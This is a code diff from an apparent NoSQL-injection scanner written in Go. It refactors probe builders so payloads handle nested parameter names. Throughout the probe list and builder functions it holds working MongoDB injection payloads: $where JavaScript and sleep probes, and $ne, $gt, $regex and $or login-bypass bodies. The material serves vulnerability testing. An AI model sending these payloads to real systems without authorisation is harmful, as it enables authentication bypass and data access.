@@ -37,14 +37,14 @@ func Probes(param string) []Probe {
 		{Name: "where_js", Value: `{"$where":"this.password.match(/.*/)"}`, Signal: "where_injection", Mode: "query"},
 		{Name: "where_eval", Value: `{"$where":"(function(){throw new Error(\"AKCA_NOSQL_\"+(71*73)+\"_EVAL\")})()"}`, Signal: "where_eval_injection", Mode: "query"},
 		{Name: "where_sleep", Value: `{"$where":"sleep(5000)"}`, Signal: "where_injection", Mode: "query"},
-		{Name: "or_operator", Value: `{"$or":[{"` + param + `":{"$ne":""}},{"password":{"$ne":""}}]}`, Signal: "auth_bypass", Mode: "json_body", ContentType: "application/json"},
+		{Name: "or_operator", Value: buildOrOperatorJSON(param), Signal: "auth_bypass", Mode: "json_body", ContentType: "application/json"},
 		{Name: "exists_operator", Value: `{"$exists":true}`, Signal: "operator_injection", Mode: "query"},
 		{Name: "in_operator", Value: `{"$in":["admin","root","user"]}`, Signal: "operator_injection", Mode: "query"},
 		{Name: "expr_gt", Value: `{"$expr":{"$gt":["$password",""]}}`, Signal: "operator_injection", Mode: "query"},
 		{Name: "js_truthy", Value: `' || '1'=='1`, Signal: "js_injection", Mode: "query"},
 		{Name: "json_login_bypass", Value: buildLoginBypassJSON(param), Signal: "auth_bypass", Mode: "json_body", ContentType: "application/json"},
 		{Name: "json_ne_bypass", Value: buildNEBypassJSON(param), Signal: "auth_bypass", Mode: "json_body", ContentType: "application/json"},
-		{Name: "json_gt_pair", Value: `{"` + param + `":{"$gt":""},"password":{"$gt":""}}`, Signal: "auth_bypass", Mode: "json_body", ContentType: "application/json"},
+		{Name: "json_gt_pair", Value: buildGTPairJSON(param), Signal: "auth_bypass", Mode: "json_body", ContentType: "application/json"},
 		{Name: "bracket_ne", Value: "", Signal: "bracket_injection", Mode: "bracket_query"},
 		{Name: "bracket_gt", Value: "", Signal: "bracket_injection", Mode: "bracket_query"},
 		{Name: "bracket_regex", Value: "", Signal: "bracket_injection", Mode: "bracket_query"},
@@ -85,32 +85,65 @@ func ProbesForTarget(param, endpointURL, contentType, method string) []Probe {
 	return out
 }
 
+func setNestedMap(m map[string]interface{}, path []string, val interface{}) {
+	if len(path) == 0 {
+		return
+	}
+	if len(path) == 1 {
+		m[path[0]] = val
+		return
+	}
+	sub, ok := m[path[0]].(map[string]interface{})
+	if !ok {
+		sub = make(map[string]interface{})
+		m[path[0]] = sub
+	}
+	setNestedMap(sub, path[1:], val)
+}
+
 // ControlBody returns a benign JSON body for differential confirmation.
 func ControlBody(param string) string {
 	if param == "" {
 		param = "username"
 	}
-	body := map[string]string{
-		param:      "akca_nosql_control",
-		"password": "akca_nosql_control",
-	}
+	body := make(map[string]interface{})
+	setNestedMap(body, strings.Split(param, "."), "akca_nosql_control")
+	body["password"] = "akca_nosql_control"
 	raw, _ := json.Marshal(body)
 	return string(raw)
 }
 
 func buildLoginBypassJSON(param string) string {
-	body := map[string]interface{}{
-		param:      map[string]string{"$ne": ""},
-		"password": map[string]string{"$ne": ""},
-	}
+	body := make(map[string]interface{})
+	setNestedMap(body, strings.Split(param, "."), map[string]string{"$ne": ""})
+	body["password"] = map[string]string{"$ne": ""}
 	raw, _ := json.Marshal(body)
 	return string(raw)
 }
 
 func buildNEBypassJSON(param string) string {
-	body := map[string]interface{}{
-		param: map[string]string{"$regex": ".*"},
+	body := make(map[string]interface{})
+	setNestedMap(body, strings.Split(param, "."), map[string]string{"$regex": ".*"})
+	raw, _ := json.Marshal(body)
+	return string(raw)
+}
+
+func buildGTPairJSON(param string) string {
+	body := make(map[string]interface{})
+	setNestedMap(body, strings.Split(param, "."), map[string]string{"$gt": ""})
+	body["password"] = map[string]string{"$gt": ""}
+	raw, _ := json.Marshal(body)
+	return string(raw)
+}
+
+func buildOrOperatorJSON(param string) string {
+	paramMap := make(map[string]interface{})
+	setNestedMap(paramMap, strings.Split(param, "."), map[string]string{"$ne": ""})
+	orList := []interface{}{
+		paramMap,
+		map[string]interface{}{"password": map[string]string{"$ne": ""}},
 	}
+	body := map[string]interface{}{"$or": orList}
 	raw, _ := json.Marshal(body)
 	return string(raw)
 }
